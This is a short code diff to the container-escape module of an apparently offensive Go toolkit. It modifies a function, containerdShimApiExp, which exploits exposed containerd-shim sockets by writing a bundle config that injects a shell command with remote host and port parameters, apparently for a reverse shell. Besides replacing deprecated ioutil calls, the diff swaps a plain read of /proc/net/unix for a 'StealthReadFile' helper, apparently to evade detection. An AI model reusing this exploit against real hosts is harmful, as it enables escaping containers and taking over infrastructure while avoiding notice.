@@ -22,7 +22,6 @@ package escaping
 import (
 	"context"
 	"fmt"
-	"io/ioutil"
 	"log"
 	"net"
 	"os"
@@ -140,7 +139,7 @@ func containerdShimApiExp(sock, shellCmd, rhost, rport string) error {
 	config := strings.Replace(configJson, "$BASH_PATH$", util.BashPath(), -1)
 	config = strings.Replace(config, "$SHELLCMD$", payloadShellCmd, -1)
 
-	err = ioutil.WriteFile(localBundlePath+"/config.json", []byte(config), 0666)
+	err = os.WriteFile(localBundlePath+"/config.json", []byte(config), 0666)
 	if err != nil {
 		return &errors.CDKRuntimeError{Err: err, CustomMsg: "failed to write file."}
 	}
@@ -167,7 +166,7 @@ func getShimSockets() ([][]byte, error) {
 	if err != nil {
 		return nil, err
 	}
-	data, err := ioutil.ReadFile("/proc/net/unix")
+	data, err := util.StealthReadFile(util.ProcNetUnixPath())
 	matches := re.FindAll(data, -1)
 	if matches == nil {
 		return nil, errors.New("Cannot find vulnerable containerd-shim socket.")
